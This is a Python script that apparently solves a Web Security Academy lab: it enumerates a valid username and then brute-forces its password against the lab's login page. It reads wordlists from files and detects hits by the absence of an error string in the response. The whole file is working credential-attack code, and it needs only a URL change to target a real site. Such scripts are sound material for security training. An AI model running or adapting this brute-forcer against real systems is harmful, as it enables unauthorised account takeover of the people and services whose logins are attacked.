import requests
from tqdm import tqdm

with open('usernames.txt', 'r') as r:
    usernames = r.read().split('\n')

with open('passwords.txt', 'r') as r:
    passwords = r.read().split('\n')

url = 'https://0aec007d0342753d80eb71c200bb0005.web-security-academy.net/login'

data = {
    'username':'testuser',
    'password':'testpass'
}

with requests.session() as s:
    for username in tqdm(usernames):
        data['username'] = username
        r = s.post(url=url, data=data)
        if 'Invalid username or password.' not in r.text:
            print(f"{username=}")
            break

with requests.session() as s:
    for password in tqdm(passwords):
        data['password'] = password
        r = s.post(url=url, data=data)
        if 'Invalid username or password' not in r.text:
            print(f"{password=}")
            break